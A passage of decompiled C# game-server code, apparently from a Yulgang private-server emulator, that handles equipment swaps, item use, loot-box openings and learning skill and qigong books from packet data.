									if ((itmeClass17.FLD_JOB_LEVEL != 0 && itmeClass17.FLD_JOB_LEVEL > base.Player_Job_leve) || (itmeClass17.FLD_SEX != 0 && itmeClass17.FLD_SEX != base.Player_Sex) || (itmeClass17.FLD_XWJD >= 1 && itmeClass17.FLD_XWJD > base.武勋阶段) || itmeClass17.FLD_RESIDE2 < 1 || itmeClass17.FLD_RESIDE2 > 16)
									{
										return;
									}
									if (BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0) == 0)
									{
										if (itmeClass17.FLD_RESIDE2 != num4 + 1 && ((itmeClass17.FLD_RESIDE2 != 2 && itmeClass17.FLD_RESIDE2 != 3 && itmeClass17.FLD_RESIDE2 != 8 && itmeClass17.FLD_RESIDE2 != 9 && itmeClass17.FLD_RESIDE2 != 10 && itmeClass17.FLD_RESIDE2 != 11) || itmeClass17.FLD_RESIDE2 != num4))
										{
											return;
										}
										辅助装备栏装备[num4].物品_byte = 辅助装备栏装备[num2].物品_byte;
										辅助装备栏装备[num2].物品_byte = 物品_byte;
										更换装备位置(num, num2, num3, num4, 辅助装备栏装备[num4].物品_byte, BitConverter.ToInt32(辅助装备栏装备[num4].物品数量, 0));
									}
									else
									{
										if (BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0) == 0)
										{
											return;
										}
										ItmeClass itmeClass18 = World.Itme[BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0)];
										if (itmeClass17.FLD_RESIDE2 != itmeClass18.FLD_RESIDE2)
										{
											return;
										}
										byte[] 物品_byte15 = 辅助装备栏装备[num4].物品_byte;
										辅助装备栏装备[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
										辅助装备栏装备[num2].物品_byte = 物品_byte15;
										更换装备位置(num, num2, num3, num4, 辅助装备栏装备[num4].物品_byte, BitConverter.ToInt32(辅助装备栏装备[num4].物品数量, 0));
									}
									break;
								}
								}
								更新人物数据(this);
								更新广播人物数据();
								更新装备效果();
								计算人物装备数据();
								更新武功和状态();
								更新金钱和负重();
								更新HP_MP_SP();
							}
							break;
						}
						case 60:
							if (!人物灵兽.宠物装备栏[num2].物品绑定)
							{
								if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
								{
									装备栏包裹[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
									人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte;
									更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
								}
								else
								{
									byte[] 物品_byte2 = 装备栏包裹[num4].物品_byte;
									装备栏包裹[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
									人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte2;
									更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
								}
								更新灵兽负重();
							}
							break;
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "更换装备出错  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
			}
		}

		public void 打开物品(byte[] 封包数据, int 封包大小)
		{
			if (base.人物_HP > 0)
			{
				封包修改(封包数据, 封包大小);
				if (!打开仓库中 && (个人商店 == null || !个人商店.个人商店是否开启))
				{
					try
					{
						byte[] array = new byte[4];
						System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
						int num = BitConverter.ToInt32(array, 0);
						int num2 = 封包数据[10];
						int num3 = 封包数据[11];
						BitConverter.ToInt32(封包数据, 26);
						switch (num2)
						{
						case 60:
							if (num3 != 14 || 人物灵兽 == null)
							{
								ItmeClass itmeClass = World.Itme[BitConverter.ToInt32(人物灵兽.宠物装备栏[num3].物品ID, 0)];
								if (BitConverter.ToInt32(人物灵兽.宠物以装备[4].物品ID, 0) == 0)
								{
									人物灵兽.宠物以装备[itmeClass.FLD_RESIDE2 - 1].物品_byte = 人物灵兽.宠物装备栏[num3].物品_byte;
									人物灵兽.宠物装备栏[num3].物品_byte = new byte[World.数据库单个物品大小];
									更换装备位置(num2, num3, num2 - 1, itmeClass.FLD_RESIDE2 - 1, 人物灵兽.宠物以装备[4].物品_byte, 1);
									更新灵兽负重();
									更新灵兽经验和历练();
									人物灵兽.计算基本数据();
									更新灵兽HP_MP_SP();
									更新灵兽武功和状态();
									更新人物数据(this);
								}
							}
							break;
						case 1:
							if (BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) != 0)
							{
								if (装备栏包裹[num3].物品绑定)
								{
									num -= 20000;
								}
								if (BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) == num && !装备栏包裹[num3].锁定)
								{
									ItmeClass itmeClass2 = World.Itme[BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0)];
									if (itmeClass2.FLD_RESIDE2 >= 1 && itmeClass2.FLD_RESIDE2 <= 1)
									{
										if (itmeClass2.FLD_LEVEL <= base.Player_Level && (itmeClass2.FLD_ZX == 0 || itmeClass2.FLD_ZX == base.Player_Zx) && (itmeClass2.FLD_RESIDE1 == 0 || itmeClass2.FLD_RESIDE1 == base.Player_Job) && (itmeClass2.FLD_JOB_LEVEL == 0 || itmeClass2.FLD_JOB_LEVEL <= base.Player_Job_leve) && (itmeClass2.FLD_SEX == 0 || itmeClass2.FLD_SEX == base.Player_Sex) && (itmeClass2.FLD_XWJD < 1 || itmeClass2.FLD_XWJD <= base.武勋阶段))
										{
											ItmeClass itmeClass3 = World.Itme[BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0)];
											if (BitConverter.ToInt32(装备栏已穿装备[itmeClass3.FLD_RESIDE2 - 1].物品ID, 0) == 0)
											{
												装备栏已穿装备[itmeClass3.FLD_RESIDE2 - 1].物品_byte = 装备栏包裹[num3].物品_byte;
												装备栏包裹[num3].物品_byte = new byte[World.数据库单个物品大小];
												更换装备位置(num2, num3, 0, itmeClass3.FLD_RESIDE2 - 1, 装备栏已穿装备[itmeClass3.FLD_RESIDE2 - 1].物品_byte, 1);
												计算人物装备数据();
												更新装备效果();
												更新武功和状态();
												更新金钱和负重();
												更新HP_MP_SP();
											}
										}
									}
									else if (itmeClass2.FLD_RESIDE2 == 17)
									{
										开箱(封包数据);
									}
									else if (itmeClass2.FLD_RESIDE2 == 19)
									{
										气功书(封包数据);
									}
									else if (itmeClass2.FLD_RESIDE2 == 20)
									{
										打开物品触发器(封包数据);
									}
									else if (itmeClass2.FLD_RESIDE2 == 1792)
									{
										武功书(封包数据);
									}
									else
									{
										吃药(封包数据);
									}
								}
							}
							break;
						case 0:
							if (num3 != 14 || 人物灵兽 == null)
							{
								int num4 = 0;
								while (true)
								{
									if (num4 >= 36)
									{
										return;
									}
									if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
									{
										break;
									}
									num4++;
								}
								装备栏包裹[num4].物品_byte = 装备栏已穿装备[num3].物品_byte;
								装备栏已穿装备[num3].物品_byte = new byte[World.数据库单个物品大小];
								更换装备位置(num2, num3, 1, num4, 装备栏包裹[num4].物品_byte, 1);
								更新装备效果();
								计算人物装备数据();
								更新武功和状态();
								更新金钱和负重();
								更新HP_MP_SP();
							}
							break;
						}
					}
					catch (Exception ex)
					{
						Form1.WriteLine(1, "打开物品出错  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
					}
				}
			}
		}

		public void 开箱(byte[] data)
		{
			try
			{
				if ((int)DateTime.Now.Subtract(开箱时间).TotalMilliseconds >= 1000)
				{
					开箱时间 = DateTime.Now;
					int num = data[11];
					byte[] array = new byte[4];
					System.Buffer.BlockCopy(data, 14, array, 0, 4);
					int num2 = BitConverter.ToInt32(array, 0);
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == num2 && num2 != 0)
					{
						using (new Lock(World.开箱Lock, "开箱Lock"))
						{
							OpenClass open = OpenClass.GetOpen(BitConverter.ToInt32(array, 0), base.Player_Job, base.Player_Zx);
							ItmeClass value;
							if (open == null)
							{
								减去物品(num, 1);
								系统提示("没有获得任何物品", 50, "");
							}
							else if (!World.Itme.TryGetValue(open.FLD_PIDX, out value))
							{
								Form1.WriteLine(1, "开箱  出错1  物品  [" + open.FLD_PID + "][" + open.FLD_NAME + "]开[" + open.FLD_PIDX + "][" + open.FLD_NAMEX + "]  [" + base.Userid + "][" + base.UserName + "]  ");
							}
							else
							{
								int num3 = open.FLD_MAGIC1;
								int value2 = open.FLD_MAGIC2;
								if (value.FLD_RESIDE2 == 16)
								{
									if (num3 == 0)
									{
										switch (value.FLD_PID)
										{
										case 800000001:
										case 800000002:
										case 800000011:
										case 800000012:
										case 800000013:
										case 800000023:
										case 800000024:
										case 800000028:
										case 800000030:
										case 800000031:
										case 800000032:
										case 800000033:
										case 800000061:
										case 800000062:
											num3 = World.GetValue(value.FLD_PID, 6);
											break;
										}
									}
								}
								else
								{
									switch (value.FLD_PID)
									{
									case 1000000321:
										num3 = RNG.Next(0, 1000);
										value2 = RNG.Next(10, 50);
										break;
									case 1000000323:
										num3 = RNG.Next(0, 1000);
										value2 = RNG.Next(100, 150);
										break;
									case 1000000325:
										num3 = RNG.Next(0, 1000);
										value2 = RNG.Next(400, 699);
										break;
									case 1000000327:
										num3 = RNG.Next(0, 1000);
										value2 = RNG.Next(2000, 2499);
										break;
									}
								}
								减去物品(num, 1);
								byte[] array2 = new byte[56];
								System.Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array2, 0, 4);
								System.Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array2, 4, 4);
								System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_MAGIC3), 0, array2, 8, 4);
								System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_MAGIC4), 0, array2, 12, 4);
								System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_MAGIC5), 0, array2, 16, 4);
								if (open.FLD_中级附魂 > 0)
								{
									System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array2, 22, 2);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_中级附魂), 0, array2, 24, 4);
								}
								System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_觉醒), 0, array2, 46, 4);
								System.Buffer.BlockCopy(BitConverter.GetBytes(open.FLD_进化), 0, array2, 52, 4);
								byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
								增加物品(bytes, BitConverter.GetBytes(open.FLD_PIDX), num, BitConverter.GetBytes(open.FLD_NUMBER), array2);
								RxjhClass.掉落记录(base.Userid, base.UserName, BitConverter.ToInt64(bytes, 0), value.FLD_PID, value.ItmeNAME, value.FLD_MAGIC0, value.FLD_MAGIC1, value.FLD_MAGIC2, value.FLD_MAGIC3, value.FLD_MAGIC4, base.人物坐标_地图, (int)base.人物坐标_X, (int)base.人物坐标_Y, "开箱");
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				byte[] array3 = new byte[4];
				System.Buffer.BlockCopy(data, 14, array3, 0, 4);
				Form1.WriteLine(1, "开箱  出错  [" + base.Userid + "][" + base.UserName + "]  箱ID是：" + BitConverter.ToInt32(array3, 0) + ex.Message);
			}
		}

		public void 气功书(byte[] 封包数据)
		{
			try
			{
				if (!base.Player死亡)
				{
					int num = 封包数据[11];
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
					System.Buffer.BlockCopy(封包数据, 26, array2, 0, 4);
					int num2 = BitConverter.ToInt32(array, 0);
					BitConverter.ToInt32(array2, 0);
					ItmeClass value;
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == num2 && BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) != 0 && World.Itme.TryGetValue(num2, out value))
					{
						foreach (升天气功总类 value2 in World.升天气功List.Values)
						{
							if (value2.物品ID == num2)
							{
								if (value.FLD_LEVEL <= base.Player_Level && (value.FLD_ZX == 0 || value.FLD_ZX == base.Player_Zx) && (value.FLD_RESIDE1 == 0 || value.FLD_RESIDE1 == base.Player_Job) && (value.FLD_JOB_LEVEL == 0 || value.FLD_JOB_LEVEL <= base.Player_Job_leve))
								{
									if (value.FLD_NEED_MONEY > 0 && base.Player_Money < value.FLD_NEED_MONEY)
									{
										系统提示("游戏币不够了。");
									}
									else if (value.FLD_NEED_FIGHTEXP <= 0 || base.Player_Money >= value.FLD_NEED_FIGHTEXP)
									{
										switch (base.Player_Job)
										{
										case 1:
											if (value2.人物职业1 == 0)
											{
												return;
											}
											break;
										case 2:
											if (value2.人物职业2 == 0)
											{
												return;
											}
											break;
										case 3:
											if (value2.人物职业3 == 0)
											{
												return;
											}
											break;
										case 4:
											if (value2.人物职业4 == 0)
											{
												return;
											}
											break;
										case 5:
											if (value2.人物职业5 == 0)
											{
												return;
											}
											break;
										case 6:
											if (value2.人物职业6 == 0)
											{
												return;
											}
											break;
										case 7:
											if (value2.人物职业7 == 0)
											{
												return;
											}
											break;
										case 8:
											if (value2.人物职业8 == 0)
											{
												return;
											}
											break;
										case 9:
											if (value2.人物职业9 == 0)
											{
												return;
											}
											break;
										case 10:
											if (value2.人物职业10 == 0)
											{
												return;
											}
											break;
										case 11:
											if (value2.人物职业11 == 0)
											{
												return;
											}
											break;
										case 12:
											if (value2.人物职业12 == 0)
											{
												return;
											}
											break;
										case 13:
											if (value2.人物职业13 == 0)
											{
												return;
											}
											break;
										}
										升天气功类 升天气功类 = new 升天气功类();
										升天气功类.气功ID = value2.气功ID;
										if (!GetSTQG(升天气功类.气功ID))
										{
											升天气功.Add(升天气功类.气功ID, 升天气功类);
											物品使用(1, num, 1);
											base.Player_Money -= value.FLD_NEED_MONEY;
											base.Player_ExpErience -= value.FLD_NEED_FIGHTEXP;
											学习技能提示();
											更新武功和状态();
											更新金钱和负重();
										}
									}
								}
								break;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "气功书 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 打开物品触发器(byte[] 封包数据)
		{
			try
			{
				if (!base.Player死亡)
				{
					int num = 封包数据[11];
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
					System.Buffer.BlockCopy(封包数据, 22, array2, 0, 4);
					int num2 = BitConverter.ToInt32(array, 0);
					BitConverter.ToInt32(array2, 0);
					ItmeClass value;
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == num2 && World.Itme.TryGetValue(num2, out value) && BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) != 0)
					{
						try
						{
							if (World.脚本.打开物品事件 != null)
							{
								object[] args = new object[4]
								{
									base.人物全服ID,
									num2,
									num,
									BitConverter.ToInt32(装备栏包裹[num].物品数量, 0)
								};
								World.脚本.打开物品事件.Call(args);
							}
						}
						catch (Exception ex)
						{
							Form1.WriteLine(2, "OpenItmeTrigGer(" + base.人物全服ID + "," + num2 + "," + num + "," + BitConverter.ToInt32(装备栏包裹[num].物品数量, 0) + ")");
							Form1.WriteLine(2, "打开物品触发器1出错--" + ex.Message);
						}
					}
				}
			}
			catch (Exception ex2)
			{
				Form1.WriteLine(2, "打开物品触发器2出错--" + ex2.Message);
			}
		}

		public void 四神变更提示(int 物品位置, int 道具ID, int 提示ID)
		{
			try
			{
				发包类 发包类 = new 发包类();
				发包类.Write1(1);
				发包类.Write1(物品位置);
				发包类.Write2(0);
				发包类.Write4(道具ID);
				发包类.Write4(0);
				发包类.Write4(提示ID);
				发包类.Write2(1);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 15104, base.人物全服ID);
				}
			}
			catch
			{
			}
		}

		public void 武功书(byte[] 封包数据)
		{
			try
			{
				int num2;
				int num3;
				if (!base.Player死亡 && !人物锁定)
				{
					byte num = 封包数据[10];
					num2 = 封包数据[11];
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
					System.Buffer.BlockCopy(封包数据, 22, array2, 0, 4);
					num3 = BitConverter.ToInt32(array, 0);
					BitConverter.ToInt32(array2, 0);
					if (num == 60)
					{
						if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num2].物品ID, 0) == num3 && BitConverter.ToInt32(人物灵兽.宠物装备栏[num2].物品ID, 0) != 0)
						{
							goto IL_00c2;
						}
					}
					else if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == num3 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 0)
					{
						goto IL_00c2;
					}
				}
				goto end_IL_0000;
				IL_00c2:
				ItmeClass value;
				if ((!World.Itme.TryGetValue(num3, out value) || BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 0) && value.FLD_LEVEL <= base.Player_Level && (value.FLD_ZX == 0 || value.FLD_ZX == base.Player_Zx) && (value.FLD_RESIDE1 == 0 || value.FLD_RESIDE1 == base.Player_Job) && (value.FLD_JOB_LEVEL == 0 || value.FLD_JOB_LEVEL <= base.Player_Job_leve) && (value.FLD_NEED_FIGHTEXP <= 0 || base.Player_ExpErience >= value.FLD_NEED_FIGHTEXP))
				{
					if (value.FLD_NEED_MONEY > 0 && base.Player_Money < value.FLD_NEED_MONEY)
					{
						系统提示("游戏币不够了。");
					}
					else
					{
						switch (num3)
						{
						case 1000000300:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000301:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000302:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000303:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000304:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000305:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000313:
							if (!武功类.检查修炼条件(this, 1, 17))
							{
								return;
							}
							武功类.学习武功书(this, 1, 17);
							break;
						case 1000000314:
							if (!武功类.检查修炼条件(this, 1, 18))
							{
								return;
							}
							武功类.学习武功书(this, 1, 18);
							break;
						case 1000000315:
							if (!武功类.检查修炼条件(this, 1, 21))
							{
								return;
							}
							武功类.学习武功书(this, 1, 21);
							break;
						case 1000000316:
							if (!武功类.检查修炼条件(this, 1, 22))
							{
								return;
							}
							武功类.学习武功书(this, 1, 22);
							break;
						case 1000000317:
							if (!武功类.检查修炼条件(this, 1, 23))
							{
								return;
							}
							武功类.学习武功书(this, 1, 23);
							break;
						case 1000000318:
						{
							武功类 wg = 武功类.GetWg(801401);
							if (wg != null)
							{
								if ((wg.FLD_ZX != 0 && base.Player_Zx != wg.FLD_ZX) || (wg.FLD_JOB != 0 && base.Player_Job != wg.FLD_JOB) || (wg.FLD_JOBLEVEL != 0 && base.Player_Job_leve < wg.FLD_JOBLEVEL) || (wg.FLD_LEVEL != 0 && base.Player_Level < wg.FLD_LEVEL))
								{
									return;
								}
								武功新[wg.FLD_武功类型, wg.FLD_INDEX] = new 武功类(wg.FLD_PID);
							}
							break;
						}
						case 1000000320:
							if (!武功类.检查修炼条件(this, 1, 9))
							{
								return;
							}
							武功类.学习武功书(this, 1, 9);
							break;
						case 1000000200:
						{
							if (base.FLD_情侣.Length == 0)
							{
								return;
							}
							if (FLD_爱情度等级 > 4)
							{
								系统提示("爱情度等级达到4级以上才能修炼。");
								return;
							}
							if (是否已婚 != 1)
							{
								return;
							}
							int key2 = 0;
							if (base.Player_Job == 1)
							{
								key2 = 100301;
							}
							else if (base.Player_Job == 2)
							{
								key2 = 200301;
							}
							else if (base.Player_Job == 3)
							{
								key2 = 300301;
							}
							else if (base.Player_Job == 4)
							{
								key2 = 400301;
							}
							else if (base.Player_Job == 5)
							{
								key2 = 500301;
							}
							else if (base.Player_Job == 6)
							{
								key2 = 800301;
							}
							else if (base.Player_Job == 7)
							{
								key2 = 900301;
							}
							else if (base.Player_Job == 8)
							{
								key2 = 1000301;
							}
							else if (base.Player_Job == 9)
							{
								key2 = 2000301;
							}
							else if (base.Player_Job == 10)
							{
								key2 = 3000301;
							}
							else if (base.Player_Job == 11)
							{
								key2 = 4000301;
							}
							else if (base.Player_Job == 12)
							{
								key2 = 5000301;
							}
							武功类 value3;
							if (World.TBL_KONGFU.TryGetValue(key2, out value3))
							{
								武功新[value3.FLD_武功类型, value3.FLD_INDEX] = new 武功类(value3.FLD_PID);
								记算夫妻武功攻击力数据();
							}
							RxjhClass.药品记录(base.Userid, base.UserName, num3, value.ItmeNAME, 1);
							break;
						}
						case 1000000213:
						{
							if (base.FLD_情侣.Length == 0)
							{
								return;
							}
							if (FLD_爱情度等级 > 4)
							{
								系统提示("爱情度等级达到4级以上才能修炼。");
								return;
							}
							if (是否已婚 != 1)
							{
								return;
							}
							int key = 0;
							if (base.Player_Sex == 1)
							{
								key = 601201;
							}
							else if (base.Player_Sex == 2)
							{
								key = 601202;
							}
							武功类 value2;
							if (World.TBL_KONGFU.TryGetValue(key, out value2))
							{
								武功新[value2.FLD_武功类型, value2.FLD_INDEX] = new 武功类(value2.FLD_PID);
								记算夫妻武功攻击力数据();
							}
							RxjhClass.药品记录(base.Userid, base.UserName, num3, value.ItmeNAME, 1);
							break;
						}
						case 1000000217:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000218:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000219:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000220:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000221:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000222:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000223:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000224:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000225:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000226:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000227:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000228:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000229:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000230:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000231:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000232:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000233:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000234:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000235:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000236:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000237:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000238:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000239:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000240:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000241:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000242:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000243:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000244:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000245:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000246:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000247:
							if (!武功类.检查修炼条件(this, 1, 5))
							{
								return;
							}
							武功类.学习武功书(this, 1, 5);
							break;
						case 1000000248:
							if (!武功类.检查修炼条件(this, 1, 5))
							{
								return;
							}
							武功类.学习武功书(this, 1, 5);
							break;
						case 1000000249:
							if (!武功类.检查修炼条件(this, 1, 13))
							{
								return;
							}
							武功类.学习武功书(this, 1, 13);
							break;
						case 1000001003:
							if (!武功类.检查修炼条件(this, 0, 23))
							{
								return;
							}
							武功类.学习武功书(this, 0, 23);
							武功类.学习武功书(this, 0, 24);
							break;
						case 1000001004:
							if (!武功类.检查修炼条件(this, 0, 19))
							{
								return;
							}
							武功类.学习武功书(this, 0, 19);
							break;
						case 1000001005:
							if (!武功类.检查修炼条件(this, 1, 9))
							{
								return;
							}
							武功类.学习武功书(this, 1, 9);
							break;
						case 1000001006:
							if (!武功类.检查修炼条件(this, 1, 12))
							{
								return;
							}
							武功类.学习武功书(this, 1, 12);
							break;
						case 1000001007:
							if (!武功类.检查修炼条件(this, 1, 14))
							{
								return;
							}
							武功类.学习武功书(this, 1, 14);
							break;
						case 1000001008:
							if (!武功类.检查修炼条件(this, 1, 17))
							{
								return;
							}
							武功类.学习武功书(this, 1, 17);
							break;
						case 1000001009:
							if (!武功类.检查修炼条件(this, 1, 5))
							{
								return;
							}
							武功类.学习武功书(this, 1, 5);
							break;
						case 1000001010:
							if (!武功类.检查修炼条件(this, 3, 15))
							{
								return;
							}
							武功类.学习武功书(this, 3, 13);
							武功类.学习武功书(this, 3, 14);
							武功类.学习武功书(this, 3, 15);
							break;
						case 1000001013:
							if (!武功类.检查修炼条件(this, 3, 16))
							{
								return;
							}
							武功类.学习武功书(this, 3, 16);
							武功类.学习武功书(this, 3, 17);
							break;
						case 1000001046:
							if (!武功类.检查修炼条件(this, 3, 13))
							{
								return;
							}
							武功类.学习武功书(this, 3, 13);
							break;
						case 1000001047:
							if (!武功类.检查修炼条件(this, 3, 18))
							{
								return;
							}
							武功类.学习武功书(this, 3, 18);
							武功类.学习武功书(this, 3, 19);
							break;
						case 1000001049:
							if (!武功类.检查修炼条件(this, 1, 25))
							{
								return;
							}
							武功类.学习武功书(this, 1, 25);
							break;
						case 1000001050:
							if (!武功类.检查修炼条件(this, 1, 13))
							{
								return;
							}
							武功类.学习武功书(this, 1, 13);
							break;
						case 1000000564:
							if (!武功类.检查修炼条件(this, 0, 19))
							{
								return;
							}
							武功类.学习武功书(this, 0, 19);
							break;
						case 1000000565:
						{
							武功类 wg3 = 武功类.GetWg(1010701);
							if (wg3 == null || (wg3.FLD_ZX != 0 && base.Player_Zx != wg3.FLD_ZX) || (wg3.FLD_JOB != 0 && base.Player_Job != wg3.FLD_JOB) || (wg3.FLD_JOBLEVEL != 0 && base.Player_Job_leve < wg3.FLD_JOBLEVEL) || (wg3.FLD_LEVEL != 0 && base.Player_Level < wg3.FLD_LEVEL))
							{
								return;
							}
							武功新[wg3.FLD_武功类型, wg3.FLD_INDEX] = new 武功类(wg3.FLD_PID);
							武功新[wg3.FLD_武功类型, wg3.FLD_INDEX].武功_等级 = 1;
							break;
						}
						case 1000000566:
						{
							武功类 wg2 = 武功类.GetWg(1020701);
							if (wg2 == null || (wg2.FLD_ZX != 0 && base.Player_Zx != wg2.FLD_ZX) || (wg2.FLD_JOB != 0 && base.Player_Job != wg2.FLD_JOB) || (wg2.FLD_JOBLEVEL != 0 && base.Player_Job_leve < wg2.FLD_JOBLEVEL) || (wg2.FLD_LEVEL != 0 && base.Player_Level < wg2.FLD_LEVEL))
							{
								return;
							}
							武功新[wg2.FLD_武功类型, wg2.FLD_INDEX] = new 武功类(wg2.FLD_PID);
							武功新[wg2.FLD_武功类型, wg2.FLD_INDEX].武功_等级 = 1;
							break;
						}
						case 1000000567:
							if (!武功类.检查修炼条件(this, 3, 1))
							{
								return;
							}
							武功类.学习武功书(this, 3, 1);
							武功类.学习武功书(this, 1, 10);
							武功类.学习武功书(this, 3, 22);
							武功类.学习武功书(this, 3, 23);
							武功类.学习武功书(this, 3, 24);
							break;
						case 1000000568:
							if (!武功类.检查修炼条件(this, 3, 5))
							{
								return;
							}
